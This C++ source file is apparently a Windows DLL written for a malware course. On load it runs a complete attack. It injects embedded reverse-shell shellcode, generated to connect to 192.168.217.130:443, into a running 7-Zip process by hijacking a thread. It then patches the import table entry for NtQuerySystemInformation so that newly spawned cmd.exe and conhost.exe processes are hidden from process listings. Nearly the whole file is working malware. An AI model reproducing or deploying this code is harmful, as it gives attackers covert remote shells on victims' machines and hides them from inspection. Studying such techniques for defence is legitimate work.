#include "pch.h"
#include <string> 
#include <winternl.h>
#include <tchar.h>
#include <psapi.h>
#include "Logger.h"
#include <wincred.h>
#include <codecvt> // for std::wstring_convert
#include <unordered_map>
#include <sstream>
#include <unordered_set>
#include <Windows.h>
#include <iostream>
#include <string>
#include <TlHelp32.h>
#include <chrono>
#include <thread>
std::unordered_map<std::string, DWORD_PTR> functionDict;
std::wstring outPutPath = L"C:\\Users\\ISE\\Desktop\\ChromeDll\\output.txt";
Logger logger(outPutPath); // Create a global instance of the Logger class
std::wstring LastError;
HMODULE hModuleInjected;
#pragma comment(lib, "Kernel32.lib")
std::unordered_set<DWORDLONG> newPIDs;

// Link against Shlwapi.lib
#pragma comment(lib, "Shlwapi.lib")
// used the command windows/x64/shell_reverse_tcp LHOST=192.168.217.130 LPORT=443 -f c -b \x00\x0a\x0d
unsigned char shellcode[] =
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\x95\xcb\xd5\x2f\x4b\x79\x0f\x84\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x69\x83\x56"
"\xcb\xbb\x91\xcf\x84\x95\xcb\x94\x7e\x0a\x29\x5d\xd5\xc3"
"\x83\xe4\xfd\x2e\x31\x84\xd6\xf5\x83\x5e\x7d\x53\x31\x84"
"\xd6\xb5\x83\x5e\x5d\x1b\x31\x00\x33\xdf\x81\x98\x1e\x82"
"\x31\x3e\x44\x39\xf7\xb4\x53\x49\x55\x2f\xc5\x54\x02\xd8"
"\x6e\x4a\xb8\xed\x69\xc7\x8a\x84\x67\xc0\x2b\x2f\x0f\xd7"
"\xf7\x9d\x2e\x9b\xf2\x8f\x0c\x95\xcb\xd5\x67\xce\xb9\x7b"
"\xe3\xdd\xca\x05\x7f\xc0\x31\x17\xc0\x1e\x8b\xf5\x66\x4a"
"\xa9\xec\xd2\xdd\x34\x1c\x6e\xc0\x4d\x87\xcc\x94\x1d\x98"
"\x1e\x82\x31\x3e\x44\x39\x8a\x14\xe6\x46\x38\x0e\x45\xad"
"\x2b\xa0\xde\x07\x7a\x43\xa0\x9d\x8e\xec\xfe\x3e\xa1\x57"
"\xc0\x1e\x8b\xf1\x66\x4a\xa9\x69\xc5\x1e\xc7\x9d\x6b\xc0"
"\x39\x13\xcd\x94\x1b\x94\xa4\x4f\xf1\x47\x85\x45\x8a\x8d"
"\x6e\x13\x27\x56\xde\xd4\x93\x94\x76\x0a\x23\x47\x07\x79"
"\xeb\x94\x7d\xb4\x99\x57\xc5\xcc\x91\x9d\xa4\x59\x90\x58"
"\x7b\x6a\x34\x88\x66\xf5\x0e\x7c\xb6\xca\xf8\xe7\x2f\x4b"
"\x38\x59\xcd\x1c\x2d\x9d\xae\xa7\xd9\x0e\x84\x95\x82\x5c"
"\xca\x02\xc5\x0d\x84\x94\x70\x15\x87\x92\xfb\x4e\xd0\xdc"
"\x42\x31\x63\xc2\x88\x4e\x3e\xd9\xbc\xf3\x28\xb4\xac\x43"
"\x0d\x7f\xa3\xd4\x2e\x4b\x79\x56\xc5\x2f\xe2\x55\x44\x4b"
"\x86\xda\xd4\xc5\x86\xe4\xe6\x06\x48\xcf\xcc\x6a\x0b\x9d"
"\xa6\x89\x31\xf0\x44\xdd\x42\x14\x6e\xf1\x93\x00\x5b\x75"
"\x34\x00\x67\xc2\xbe\x65\x94\xd4\x93\x99\xa6\xa9\x31\x86"
"\x7d\xd4\x71\x4c\x8a\x3f\x18\xf0\x51\xdd\x4a\x11\x6f\x49"
"\x79\x0f\xcd\x2d\xa8\xb8\x4b\x4b\x79\x0f\x84\x95\x8a\x85"
"\x6e\x1b\x31\x86\x66\xc2\x9c\x82\x62\x7a\xb9\x65\x89\xcc"
"\x8a\x85\xcd\xb7\x1f\xc8\xc0\xb1\x9f\xd4\x2e\x03\xf4\x4b"
"\xa0\x8d\x0d\xd5\x47\x03\xf0\xe9\xd2\xc5\x8a\x85\x6e\x1b"
"\x38\x5f\xcd\x6a\x0b\x94\x7f\x02\x86\xc7\xc9\x1c\x0a\x99"
"\xa6\x8a\x38\xb5\xfd\x59\xf4\x53\xd0\x9e\x31\x3e\x56\xdd"
"\x34\x1f\xa4\x45\x38\xb5\x8c\x12\xd6\xb5\xd0\x9e\xc2\xff"
"\x31\x37\x9d\x94\x95\xed\xec\xb2\x19\x6a\x1e\x9d\xac\x8f"
"\x51\x33\x82\xe9\xc1\x55\xd4\xab\x0c\x0a\x3f\xd2\xd8\xa7"
"\x40\x21\x79\x56\xc5\x1c\x11\x2a\xfa\x4b\x79\x0f\x84";




// Function to be injected
DWORD WINAPI InjectedFunction(LPVOID lpParam) {
	MessageBoxA(NULL, "Hello from injected function!", "Injected", MB_OK);
	return 0;
}


// Function pointer type for the function to be executed by HIDinjector
typedef void(*MessageFunctionPtr)(LPCTSTR);

// Function to display a message box
void DisplayMessageBox(LPCTSTR message) {
	MessageBox(NULL, message, L"Message from InjectorA", MB_OK);
}
DWORD GetPID(const WCHAR* AppName) { // Change parameter to wchar_t* for string
	DWORD pid = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	if (Process32First(hSnap, &pe)) {
		do {
			//std::wcout << pe.szExeFile << std::endl;
			if (!wcscmp(pe.szExeFile, AppName)) { // Compare wide character strings
				pid = pe.th32ProcessID;
				break;
			}
		} while (Process32Next(hSnap, &pe));
	}
	CloseHandle(hSnap);
	return pid; // Return the PID
}
HANDLE targetProcessHandle = NULL;
PVOID remoteBuffer = NULL;
HANDLE threadHijacked = NULL;
HANDLE snapshot = NULL;


// Exec remote shell on app...
void remoteShell(const WCHAR* AppName) {
	THREADENTRY32 threadEntry;
	CONTEXT context;
	DWORD targetPID = GetPID(AppName);
	context.ContextFlags = CONTEXT_FULL;
	threadEntry.dwSize = sizeof(THREADENTRY32);

	// Open the target process
	targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
	if (targetProcessHandle == NULL) {
		std::cerr << "Error: Unable to open target process. Error code: " << GetLastError() << std::endl;
		return;
	}

	// Allocate memory in the target process for the shellcode
	remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (remoteBuffer == NULL) {
		std::cerr << "Error: Unable to allocate memory in target process. Error code: " << GetLastError() << std::endl;
		CloseHandle(targetProcessHandle);
		return;
	}

	// Write the shellcode to the allocated memory in the target process
	if (!WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, sizeof shellcode, NULL)) {
		std::cerr << "Error: Unable to write shellcode to target process memory. Error code: " << GetLastError() << std::endl;
		VirtualFreeEx(targetProcessHandle, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(targetProcessHandle);
		return;
	}

	// Create a snapshot of the threads in the target process
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (snapshot == INVALID_HANDLE_VALUE) {
		std::cerr << "Error: Unable to create snapshot of threads in target process. Error code: " << GetLastError() << std::endl;
		VirtualFreeEx(targetProcessHandle, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(targetProcessHandle);
		return;
	}

	// Find a thread in the target process to hijack
	if (!Thread32First(snapshot, &threadEntry)) {
		std::cerr << "Error: Unable to enumerate threads in target process. Error code: " << GetLastError() << std::endl;
		CloseHandle(snapshot);
		VirtualFreeEx(targetProcessHandle, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(targetProcessHandle);
		return;
	}

	// Hijack the first thread found in the target process
	while (Thread32Next(snapshot, &threadEntry)) {
		if (threadEntry.th32OwnerProcessID == targetPID) {
			threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
			if (threadHijacked != NULL) {
				break;
			}
			else {
				std::cerr << "Error: Unable to open thread in target process. Error code: " << GetLastError() << std::endl;
				CloseHandle(snapshot);
				VirtualFreeEx(targetProcessHandle, remoteBuffer, 0, MEM_RELEASE);
				CloseHandle(targetProcessHandle);
				return;
			}
		}
	}

	// Suspend the thread before modifying its context
	if (SuspendThread(threadHijacked) == (DWORD)-1) {
		std::cerr << "Error: Unable to suspend thread in target process. Error code: " << GetLastError() << std::endl;
		CloseHandle(threadHijacked);
		CloseHandle(snapshot);
		VirtualFreeEx(targetProcessHandle, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(targetProcessHandle);
		return;
	}

	// Modify the thread context to execute the shellcode
	if (!GetThreadContext(threadHijacked, &context)) {
		std::cerr << "Error: Unable to get thread context in target process. Error code: " << GetLastError() << std::endl;
		ResumeThread(threadHijacked);
		CloseHandle(threadHijacked);
		CloseHandle(snapshot);
		VirtualFreeEx(targetProcessHandle, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(targetProcessHandle);
		return;
	}
	context.Rip = (DWORD_PTR)remoteBuffer;
	if (!SetThreadContext(threadHijacked, &context)) {
		std::cerr << "Error: Unable to set thread context in target process. Error code: " << GetLastError() << std::endl;
		ResumeThread(threadHijacked);
		CloseHandle(threadHijacked);
		CloseHandle(snapshot);
		VirtualFreeEx(targetProcessHandle, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(targetProcessHandle);
		return;
	}

	// Resume the thread to execute the shellcode
	if (ResumeThread(threadHijacked) == (DWORD)-1) {
		std::cerr << "Error: Unable to resume thread in target process. Error code: " << GetLastError() << std::endl;
		CloseHandle(threadHijacked);
		CloseHandle(snapshot);
		VirtualFreeEx(targetProcessHandle, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(targetProcessHandle);
		return;
	}
}


std::unordered_set<DWORDLONG> g_CmdAndConhostPIDs;

void GetProcessPIDsByName(const std::wstring& processName) {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		std::cerr << "Error: Unable to create process snapshot. Error code: " << GetLastError() << std::endl;
		return;
	}

	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hSnapshot, &processEntry)) {
		CloseHandle(hSnapshot);
		std::cerr << "Error: Unable to retrieve first process. Error code: " << GetLastError() << std::endl;
		return;
	}

	do {
		if (std::wstring(processEntry.szExeFile) == processName) {
			g_CmdAndConhostPIDs.insert(processEntry.th32ProcessID);
		}
	} while (Process32Next(hSnapshot, &processEntry));

	CloseHandle(hSnapshot);
}





void GetNewCmdAndConhostPIDs() {

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		std::cerr << "Error: Unable to create process snapshot. Error code: " << GetLastError() << std::endl;
	}

	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hSnapshot, &processEntry)) {
		CloseHandle(hSnapshot);
		std::cerr << "Error: Unable to retrieve first process. Error code: " << GetLastError() << std::endl;
	}

	do {
		if (std::wstring(processEntry.szExeFile) == L"cmd.exe" || std::wstring(processEntry.szExeFile) == L"conhost.exe") {
			if (g_CmdAndConhostPIDs.find(processEntry.th32ProcessID) == g_CmdAndConhostPIDs.end()) {
				newPIDs.insert(processEntry.th32ProcessID);
				//std::wstring message = L"PID: " + std::to_wstring(processEntry.th32ProcessID);
				//MessageBox(NULL, message.c_str(), L"Process IDs", MB_OK | MB_ICONINFORMATION);
			}
		}
	} while (Process32Next(hSnapshot, &processEntry));

	CloseHandle(hSnapshot);
}


void GetAllCmdAndConhostPIDs() {
	// Get PIDs for cmd.exe
	GetProcessPIDsByName(L"cmd.exe");

	// Get PIDs for conhost.exe
	GetProcessPIDsByName(L"conhost.exe");
}



extern "C" __declspec(dllexport) PIMAGE_THUNK_DATA GetFirstThunk(HMODULE hModule, const CHAR* dllName, const CHAR* funcName) {
	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDOSHeader->e_lfanew);

	// Get the import descriptor
	PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule +
		pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	CHAR* szModuleName;

	while (pImportDesc->Name != NULL) {
		szModuleName = (CHAR*)((BYTE*)hModule + pImportDesc->Name);
		if (strcmp(szModuleName, dllName) == 0) {
			break;
		}
		pImportDesc++;
	}

	if (pImportDesc->Name == NULL) {
		std::string message = std::string(dllName) + " did not found";
		logger.writeStr(message);
		return NULL;
	}
	PIMAGE_THUNK_DATA ChunkData = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDesc->OriginalFirstThunk);
	PIMAGE_THUNK_DATA FirstThunkData = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDesc->FirstThunk);
	PIMAGE_IMPORT_BY_NAME import;

	while (ChunkData->u1.Function != NULL) {
		if (ChunkData->u1.Ordinal & IMAGE_ORDINAL_FLAG) { // the function is by ordinal
			//std::cout << "This function by address" << std::endl;
		}
		else {
			import = (PIMAGE_IMPORT_BY_NAME)((BYTE*)hModule + ChunkData->u1.AddressOfData);
			if (strcmp(funcName, (const char*)import->Name) == 0) {
				//printf("%s\n", (const char*)import->Name);
				break;
			}
		}
		ChunkData++;
		FirstThunkData++;
	}
	if (pImportDesc->Name == NULL) {
		std::string message = std::string(funcName) + " did not found";
		logger.writeStr(message);
		return NULL;
	}

	return FirstThunkData;
}
DWORD_PTR getPointerFromDict(std::string keyToFind) {
	auto it = functionDict.find(keyToFind);
	if (it == functionDict.end()) {
		// Key not exists
		logger.write(L"Nt function didnt fount");
		return NULL;
	}
	return (it->second);
}


int WINAPI MyMessageBox(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType) {
	logger.write(L"MessageBox was called");
	// Convert the HWND parameter to a string
	std::wstring hWndString = std::to_wstring((uintptr_t)(hWnd));

	// Write the parameters to the logger
	logger.write(L"HWND: " + hWndString);
	logger.write(L"lpText: " + std::wstring(lpText));
	logger.write(L"lpCaption: " + std::wstring(lpCaption));
	logger.write(L"uType: " + std::to_wstring(uType));

	// Call the original MessageBox function
	return 0;
}


//function sig must be like this int WINAPI MyMessageBox
extern "C" __declspec(dllexport) void PatchIAT(HMODULE hModule, const CHAR* dllName, const CHAR* funcName, DWORD_PTR newFunc) {
	if (hModule == NULL) {
		logger.write(L"Dnt file module");
	}
	logger.writeStr("Attack on dll" + std::string(dllName) + "with func" + std::string(funcName));

	PIMAGE_THUNK_DATA FirstThunkData = GetFirstThunk(hModule, dllName, funcName);
	if (FirstThunkData == NULL) {
		return;
	}
	//debug
	//typedef int(*FunctionType)(int);
	// Define a pointer type to my func
	//typedef int(WINAPI* MyMessageBoxPtr)(HWND, LPCWSTR, LPCWSTR, UINT);
	// Check the pointer
	//MyMessageBoxPtr f = (MyMessageBoxPtr)FirstThunkData->u1.Function;
	//f(NULL, L"Advanced topics in malware", L"IAT patch", MB_OK);

	MEMORY_BASIC_INFORMATION mbi;
	if (!VirtualQuery(FirstThunkData, &mbi, sizeof(mbi))) {
		// Failed to query memory information
		logger.write(L"Failed to query memory information");
	}

	DWORD oldProtect;
	// Change page to read-write-execute
	if (!VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
		// Failed to change memory protection
		logger.write(L"Failed to change memory protection");
		return;
	}
	DWORD_PTR temp_func = (DWORD_PTR)FirstThunkData->u1.Function;

	// Modify the function pointer
	FirstThunkData->u1.Function = (DWORD_PTR)newFunc;
	// Return the old privilege to PIMAGE_THUNK_DATA
	if (!VirtualProtect(mbi.BaseAddress, mbi.RegionSize, oldProtect, &oldProtect)) {
		// Failed to restore memory protection
		logger.write(L"Failed to restore memory protection");
		return;
	}
	logger.writeStr(std::to_string(FirstThunkData->u1.Function));
	logger.writeStr(std::to_string(temp_func));
	functionDict[std::string(funcName)] = temp_func;
	// Successful attack
	logger.write(L"Attack done");
}

// Function to retrieve the HMODULE of the process to which the DLL is injected
extern "C" __declspec(dllexport) HMODULE GetInjectedModuleHandle() {
	// Get the handle to the current module (the DLL)
	HMODULE hModule = GetModuleHandle(NULL);
	if (hModule != NULL) {
		// Get the handle to the process (current process)
		HANDLE hProcess = GetCurrentProcess();
		if (hProcess != NULL) {
			// Get the module handle for the current process
			HMODULE hModules[1];
			DWORD cbNeeded;
			if (EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded)) {
				// Return the first module handle found (which should be the main module of the process)
				return hModules[0];

			}
		}
	}
	// Return NULL if unsuccessful
	return NULL;
}
HWND hWndThread;
extern "C" __declspec(dllexport) BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
	DWORD processId;
	GetWindowThreadProcessId(hWnd, &processId);
	hWndThread = hWnd;
	// Check if the window belongs to the target process
	if (processId == GetCurrentProcessId()) {

		// Set the window text to the injected process name
		SetWindowText(hWnd, L"Injected Process");
		return FALSE; // Stop enumeration
	}

	return TRUE; // Continue enumeration
}

extern "C" __declspec(dllexport) void InjectedFunction() {
	// Enumerate all top-level windows to find the window of the injected process
	EnumWindows(EnumWindowsProc, 0);
}






extern "C" __declspec(dllexport) void debugProcesses(PSYSTEM_PROCESS_INFORMATION pProcessInfo) {
	PSYSTEM_PROCESS_INFORMATION pInfo = pProcessInfo;

	do {
		// Check if pInfo is null before dereferencing
		if (pInfo == nullptr) {
			break;
		}

		// Convert each value to string before printing
		std::wstring processIdStr = std::to_wstring(reinterpret_cast<ULONG_PTR>(pInfo->UniqueProcessId));
		std::wstring imageName = L"(unknown)";
		if (pInfo->ImageName.Buffer != nullptr) {
			imageName = pInfo->ImageName.Buffer;
		}

		std::wstring numberOfThreadsStr = std::to_wstring(pInfo->NumberOfThreads);

		// Print the converted values
		logger.write(L"Process ID: " + processIdStr);
		logger.write(L"  Image Name: " + imageName);
		logger.write(L"  Number of Threads: " + numberOfThreadsStr);


		// Get next process info
		if (pInfo->NextEntryOffset != 0) {
			pInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pInfo + pInfo->NextEntryOffset);
		}
		else {
			break; // Break loop if it's the last entry
		}
	} while (true);
}



// Define the function prototype for NtQuerySystemInformation
typedef NTSTATUS(WINAPI* pfnNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
	);


extern "C" __declspec(dllexport) NTSTATUS WINAPI MyNtQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
)
{
	std::string keyToFind = "NtQuerySystemInformation";
	DWORD_PTR functPointer = getPointerFromDict(keyToFind);
	if (functPointer == NULL) {
		// Key not exists
		logger.write(L"Nt function didnt fount");
		return NULL;
	}
	pfnNtQuerySystemInformation originalFunction = (pfnNtQuerySystemInformation)(functPointer);
	NTSTATUS status = ((pfnNtQuerySystemInformation)originalFunction)(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);

	if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(status))
	{
		PSYSTEM_PROCESS_INFORMATION currentProcess = NULL;
		PSYSTEM_PROCESS_INFORMATION nextProcess = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		do {
			currentProcess = nextProcess;
			nextProcess = (PSYSTEM_PROCESS_INFORMATION)((unsigned char*)currentProcess + currentProcess->NextEntryOffset);

			DWORDLONG processID = (DWORDLONG)nextProcess->UniqueProcessId;

			if (newPIDs.find(processID) != newPIDs.end()) {
				if (!nextProcess->NextEntryOffset) {
					currentProcess->NextEntryOffset = NULL;
				}
				else {
					currentProcess->NextEntryOffset += nextProcess->NextEntryOffset;
				}

				std::wstring pidString = std::to_wstring(processID);
			}
		} while (currentProcess->NextEntryOffset != NULL);

	}
	return status;
}
void KillProcesses() {
	for (DWORD pid : newPIDs) {
		HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
		if (hProcess != NULL) {
			if (!TerminateProcess(hProcess, 0)) {
				std::cerr << "Error: Unable to terminate process with PID " << pid << ". Error code: " << GetLastError() << std::endl;
			}
			else {
				std::wstring message = L"Successfully terminated process with PID " + std::to_wstring(pid);
			}
			CloseHandle(hProcess);
		}
		else {
			std::cerr << "Error: Unable to open process with PID " << pid << ". Error code: " << GetLastError() << std::endl;
		}
	}
}


// Entry point function for the DLL
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{

	// Handle different reasons for calling the DLLMain function

	if (ul_reason_for_call == DLL_PROCESS_ATTACH) {

		EnumWindows(EnumWindowsProc, 0);
		hModuleInjected = GetInjectedModuleHandle();
		if (hModuleInjected != NULL) {

			// Convert the HMODULE to a strin


			GetProcessPIDsByName(L"cmd.exe");
			GetProcessPIDsByName(L"conhost.exe");

			remoteShell(L"7zFM.exe");
			// Construct the message
			//std::wstring message = L"Injected module handle retrieved successfully.\n\nModule Handle5: " ;
			//MessageBox(NULL, message.c_str(), L"Success", MB_OK | MB_ICONINFORMATION);
			Sleep(5000);
			//wait here 5 sec

			GetNewCmdAndConhostPIDs();

			PatchIAT(GetModuleHandle(NULL), "ntdll.dll", "NtQuerySystemInformation", (DWORD_PTR)&MyNtQuerySystemInformation);

		}
		else {
			MessageBox(NULL, L"Failed to retrieve injected module handle.", L"Error", MB_OK | MB_ICONERROR);
		}



		// Enumerate all top-level windows and call EnumWindowsProc for each window



	}
	else if (ul_reason_for_call == DLL_THREAD_ATTACH) {
		// No action needed for DLL_THREAD_ATTACH
	}
	else if (ul_reason_for_call == DLL_THREAD_DETACH) {
	}
	// No action needed for DLL_THREAD_DETACH

	else if (ul_reason_for_call == DLL_PROCESS_DETACH) {
		PatchIAT(hModuleInjected, "ntdll.dll", "NtQuerySystemInformation", getPointerFromDict("NtQuerySystemInformation"));
		// Cleanup
		VirtualFreeEx(targetProcessHandle, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(threadHijacked);
		CloseHandle(targetProcessHandle);
		CloseHandle(snapshot);
		Sleep(5000);
		KillProcesses();
	}
	// No action needed for DLL_PROCESS_DETACH
	return TRUE; // Return TRUE to indicate successful execution
}